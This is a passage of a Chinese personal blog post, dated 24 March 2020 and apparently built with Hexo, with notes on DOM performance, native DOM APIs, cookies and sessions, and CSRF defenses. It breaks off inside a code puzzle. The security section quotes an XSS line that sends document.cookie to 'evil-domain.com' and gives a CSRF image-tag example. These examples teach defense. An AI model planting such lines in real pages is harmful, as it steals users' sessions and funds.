@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="如何给一个页面添加10000个div 原生js中常用的操作DOM的api接口 不同源就不能传送cooike了吗 cooike存在的安全隐患 CSRF解决办法 一道处理字符串的代码题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="日常-2020.3.24">
+<meta property="og:url" content="http://yoursite.com/2020/03/24/日常-2020.3.24/index.html">
+<meta property="og:site_name" content="-Breeze&#39;s Blog">
+<meta property="og:description" content="如何给一个页面添加10000个div 原生js中常用的操作DOM的api接口 不同源就不能传送cooike了吗 cooike存在的安全隐患 CSRF解决办法 一道处理字符串的代码题">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoia1iboy4CibSwZPdJ4vIicaMDfn9DBdicUgPViaKIjgURGqP1brnDVywuwgg/640?wx_fmt=png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoenficyGn5bX7D5CTWf44q8L0iaicCkYMpe4dCGSibbukrf4uQ52aedRSicw/640?wx_fmt=png">
+<meta property="og:updated_time" content="2020-08-14T15:34:53.550Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="日常-2020.3.24">
+<meta name="twitter:description" content="如何给一个页面添加10000个div 原生js中常用的操作DOM的api接口 不同源就不能传送cooike了吗 cooike存在的安全隐患 CSRF解决办法 一道处理字符串的代码题">
+<meta name="twitter:image" content="https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoia1iboy4CibSwZPdJ4vIicaMDfn9DBdicUgPViaKIjgURGqP1brnDVywuwgg/640?wx_fmt=png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/24/日常-2020.3.24/"/>
+
+
+
+
+
+  <title>日常-2020.3.24 | -Breeze's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+  <a href="https://github.com/jinjingxuan"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub"></a>
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">-Breeze's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">清风徐来 水波不兴</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-相册">
+          <a href="/photo/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-image"></i> <br />
+            
+            相册
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/日常-2020.3.24/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Breeze">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="-Breeze's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">日常-2020.3.24</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-24T09:52:01+08:00">
+                2020-03-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/日常/" itemprop="url" rel="index">
+                    <span itemprop="name">日常</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li>如何给一个页面添加10000个div</li>
+<li>原生js中常用的操作DOM的api接口</li>
+<li>不同源就不能传送cooike了吗</li>
+<li>cooike存在的安全隐患</li>
+<li>CSRF解决办法</li>
+<li>一道处理字符串的代码题</li>
+</ul>
+<a id="more"></a>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-cn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        body div &#123;</span></span><br><span class="line"><span class="undefined">            width: 30px;</span></span><br><span class="line"><span class="undefined">            height: 2px;</span></span><br><span class="line"><span class="undefined">            border: 1px solid #ee3333;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 利用 innerHTML 拼接字符串的方式     (添加10000个div)  (耗时约900ms） 最慢</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// function f() &#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     var date = +new Date();</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     for (var i = 1; i &lt;= 10000; i++) &#123;</span></span></span><br><span class="line"><span class="xml">    //         document.body.innerHTML += "<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>"</span></span><br><span class="line"><span class="javascript">    <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     var date1 = +new Date();</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     console.log(date1-date);</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// f();</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 利用 innerHTML 数组赋值的方式  结构稍微复杂  （添加10000个div)   （耗时约15ms)  最快</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> date = +<span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> str = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">10000</span>; i++) &#123;</span></span><br><span class="line"><span class="xml">            str.push('<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>');</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        str = str.join(<span class="string">''</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.body.innerHTML = str;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> date1 = +<span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(date1 - date);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    f();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 利用 createElement    结构清晰简单          (添加10000个div)   (耗时约20ms) 比最快慢一丢丢</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// function f() &#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     var date = +new Date();</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     for (var i = 1; i &lt;= 10000; i++) &#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//         var div = document.createElement('div');</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//         document.body.appendChild(div);</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     var date1 = +new Date();</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     console.log(date1 - date);</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// f();</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-原生JS操作DOM的API"><a href="#2-原生JS操作DOM的API" class="headerlink" title="2. 原生JS操作DOM的API"></a>2. 原生JS操作DOM的API</h2><h4 id="一-、创建型API总结"><a href="#一-、创建型API总结" class="headerlink" title="一 、创建型API总结"></a>一 、创建型API总结</h4><p>创建型API包括createElement,createTextNode,cloneNode和createDocumentFragment四个方法，需要注意下面几点:<br> (1) 它们创建的节点，只是一个孤立的节点，需要通过appendChild添加到文档中。<br> (2) cloneNode要注意，如果被复制，是否包含子节点以及事件绑定等问题。<br> (3) 使用createDocumentFragment来解决添加大量节点时的性能问题  。</p>
+<hr>
+<h4 id="二、-页面修改型API总结"><a href="#二、-页面修改型API总结" class="headerlink" title="二、 页面修改型API总结"></a>二、 页面修改型API总结</h4><p>修改页面内容的API主要包括：appendChild,removeChild,insertBefore,replaceChild<br> 需要注意几点：<br> (1) 不管是新增还是替换节点，如果新增或者替换的节点原本是存在于页面上的，则其原来位置的节点将被移除，也就是说同一个节点，不能存在于页面上的多个位置。<br> (2) 节点本身绑定的事件不会消失，会一直保留。</p>
+<hr>
+<h4 id="三、-节点查询型API总结"><a href="#三、-节点查询型API总结" class="headerlink" title="三、 节点查询型API总结"></a>三、 节点查询型API总结</h4><p>document.getElementById<br> document.getElementByName<br> document.getElementByTagName<br> document.getElementByClassName<br> document.querySelector和document.querySelectorAll：通过CSS选择器来查找元素，注意选择器要复合CSS选择器的规则。使用深度优先搜索来获取元素。</p>
+<hr>
+<h4 id="四、节点关系型API总结"><a href="#四、节点关系型API总结" class="headerlink" title="四、节点关系型API总结"></a>四、节点关系型API总结</h4><ol>
+<li>父关系型API</li>
+</ol>
+<ul>
+<li>parentNode: Element的父节点可能是Element,Document和DocumentFragment</li>
+<li>parentElement:与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null。</li>
+</ul>
+<ol>
+<li>兄弟关系型API</li>
+</ol>
+<ul>
+<li>previousSibling: 节点的前一个节点，如果该节点是第一个节点，则为null.注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下。</li>
+<li>previousElementSibling:返回前一个元素节点，前一个节点必须是Element,注意IE9以下浏览器不支持。</li>
+<li>nextSibling: 节点的后一个节点，如果该节点是最后一个节点，则为null. 注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下。</li>
+<li>nextElementSibling: 返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持。</li>
+</ul>
+<ol>
+<li>子关系型API</li>
+</ol>
+<ul>
+<li>childNodes :返回一个即时的nodeList,表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。</li>
+<li>children: 一个即时的HTMLCollection,子节点都是Element，IE9以下浏览器不支持。</li>
+<li>firstNode: 第一个子节点</li>
+<li>lastNode: 最后一个子节点</li>
+<li>hasChildNodes方法：可以用来判断是否包含子节点</li>
+</ul>
+<hr>
+<h4 id="五、元素属性型API"><a href="#五、元素属性型API" class="headerlink" title="五、元素属性型API"></a>五、元素属性型API</h4><p>setAttribute: 根据名称和值修改元素的特性，eg:element.setAttribute(name,value);<br> getAttribute: 返回指定的特性名相应的特性值，如果不存在，则返回null或空字符串。</p>
+<h4 id="六、元素样式型API"><a href="#六、元素样式型API" class="headerlink" title="六、元素样式型API"></a>六、元素样式型API</h4><p>window.getComutedStyle是用来获取应用到元素后的样式，假设某个元素并未设置高度，而是通过其内容将其高度撑开，这时候要获取它的高度，就要用到getComutedStyle，用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var style = window.getComputedStyle(element[, pseudoElt]);</span><br></pre></td></tr></table></figure>
+<p>element是要获取的元素，pseudoElt指定一个伪元素进行匹配。<br> 返回的style是一个CSSStyleDeclaration对象。<br> 通过style可以访问到元素计算后的样式<br> clientRect是一个DOMRect对象，包含left，top，right，bottom，它是相对于可视窗口的距离，滚动位置发生改变时，它们的值是会发生变化的。除了IE9以下浏览器，还包含元素的height和width等数据；</p>
+<h2 id="3-不同源就不能传送cookie了吗"><a href="#3-不同源就不能传送cookie了吗" class="headerlink" title="3. 不同源就不能传送cookie了吗"></a>3. 不同源就不能传送cookie了吗</h2><p>没错，cooike不可以跨域。下图为cookie的原理图</p>
+<p> <img src="https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoia1iboy4CibSwZPdJ4vIicaMDfn9DBdicUgPViaKIjgURGqP1brnDVywuwgg/640?wx_fmt=png" alt="1"></p>
+<p>用户在输入用户名和密码之后，浏览器将用户名和密码发送给服务器，服务器进行验证，验证通过之后将用户信息加密后封装成<strong>Cookie放在请求头中返回给浏览器</strong>。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: user_cookie=Rg3vHJZnehYLjVg7qi3bZjzg; Expires=Tue, 15 Aug 2019 21:47:38 GMT; Path=/; Domain=.169it.com; HttpOnly</span><br><span class="line"></span><br><span class="line">[响应体]</span><br><span class="line"></span><br><span class="line">//顶级域名只能设置或访问顶级域名的Cookie，二级及以下的域名只能访问或设置自身或者顶级域名的Cookie</span><br></pre></td></tr></table></figure>
+<p>浏览器收到服务器返回数据，发现请求头中有一个：<strong>Set-Cookie</strong>，然后它就把这个Cookie保存起来，下次浏览器再请求服务器的时候，会把Cookie也放在<strong>请求头</strong>中传给服务器： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: user_cookie=Rg3vHJZnehYLjVg7qi3bZjzg</span><br></pre></td></tr></table></figure>
+<h3 id="什么是Session"><a href="#什么是Session" class="headerlink" title="什么是Session"></a>什么是Session</h3><p>Session工作原理：</p>
+<ol>
+<li>当一个用户向服务器发送第一个请求时，服务器为其建立一个session，并为此session创建一个标识号（sessionID）。</li>
+<li>这个用户随后的所有请求都应包括这个标识号（sessionID）。服务器会校对这个标识号以判断请求属于哪个session。</li>
+</ol>
+<p>对于session标识号（sessionID），有两种方式实现：Cookie和URL重写，猪哥就以Cookie的实现方式画一个Session原理图。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/lbvmSLlcGOicIHvCd7lAde60gAEyrzKkoenficyGn5bX7D5CTWf44q8L0iaicCkYMpe4dCGSibbukrf4uQ52aedRSicw/640?wx_fmt=png" alt="2"></p>
+<h3 id="Cookie和Session关系"><a href="#Cookie和Session关系" class="headerlink" title="Cookie和Session关系"></a>Cookie和Session关系</h3><ol>
+<li>都是为了实现客户端与服务端交互而产出</li>
+<li>Cookie是保存在客户端，缺点易伪造、不安全</li>
+<li>Session是保存在服务端，会消耗服务器资源</li>
+<li>Session实现有两种方式：Cookie和URL重写</li>
+</ol>
+<h3 id="Cookie带来的安全性问题"><a href="#Cookie带来的安全性问题" class="headerlink" title="Cookie带来的安全性问题"></a>Cookie带来的安全性问题</h3><ol>
+<li><strong>会话劫持和XSS</strong>：在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。<code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code>HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。</li>
+<li><p><strong>跨站请求伪造（CSRF）</strong>：维基百科已经给了一个比较好的CSRF例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<code>&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</code>当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。<strong>解决CSRF的办法有：隐藏域验证码、确认机制、较短的Cookie生命周期等</strong></p>
+<h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3></li>
+</ol>
+<p><strong>（1）验证 HTTP Referer 字段</strong> </p>
+<p> 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。 </p>
+<p>如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值 。</p>
+<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的 ，目前已经有一些方法可以篡改 Referer 值 。</p>
+<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 </p>
+<p><strong>（2）在请求地址中添加 token 并验证</strong> </p>
+<p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 </p>
+<p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。 在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的。</p>
+<p><strong>（3）SameSite Cookie</strong></p>
+<p>Set-Cookie 响应头新增 SameSite 属性，它用来标明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。SameSite 有两个属性值，分别是 Strict 和 Lax</p>
+<p> <code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。 </p>
+<p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。 </p>
+<h2 id="4-一道处理字符串的代码题"><a href="#4-一道处理字符串的代码题" class="headerlink" title="4. 一道处理字符串的代码题"></a>4. 一道处理字符串的代码题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//美团一道题</span></span><br><span class="line">      <span class="keyword">let</span> str = <span class="string">"x=1&amp;&amp;y=2&amp;&amp;y=3&amp;&amp;z=4&amp;&amp;y=4"</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//输出</span></span><br><span class="line">      <span class="comment">// obj = &#123;</span></span><br><span class="line">      <span class="comment">//     x:1,</span></span><br><span class="line">      <span class="comment">//     y:[2,3],</span></span><br><span class="line">      <span class="comment">//     z:4</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> tmp = str.split(<span class="string">"&amp;&amp;"</span>)</span><br><span class="line">      <span class="keyword">let</span> left = []</span><br><span class="line">      <span class="keyword">let</span> right = []</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> tmp)&#123;</span><br><span class="line">          left.push(tmp[i].split(<span class="string">"="</span>)[<span class="number">0</span>])</span><br><span class="line">          right.push(tmp[i].split(<span class="string">"="</span>)[<span class="number">1</span>])</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">console</span>.log(left,right)</span><br><span class="line">      <span class="keyword">let</span> res = <span class="keyword">new</span> <span class="built_in">Object</span>()</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i <span 